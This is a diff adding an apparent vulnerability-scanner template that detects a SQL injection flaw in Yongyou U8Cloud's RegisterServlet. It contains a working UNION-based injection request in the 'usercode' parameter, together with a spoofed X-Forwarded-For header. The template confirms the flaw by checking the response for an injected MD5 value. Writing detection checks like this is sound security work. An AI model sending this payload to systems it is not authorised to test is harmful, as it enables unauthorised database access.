@@ -1,0 +1,32 @@
+id: yongyou-u8cloud-registerservlet-sqli
+info:
+  name: Yongyou U8Cloud RegisterServlet SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,u8cloud
+  description: |
+    Detects SQL injection vulnerability in Yongyou U8Cloud nc.bs.sm.login2.RegisterServlet.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27)),NULL,NULL,NULL,NULL-- HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Error:invalid UFDate"
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
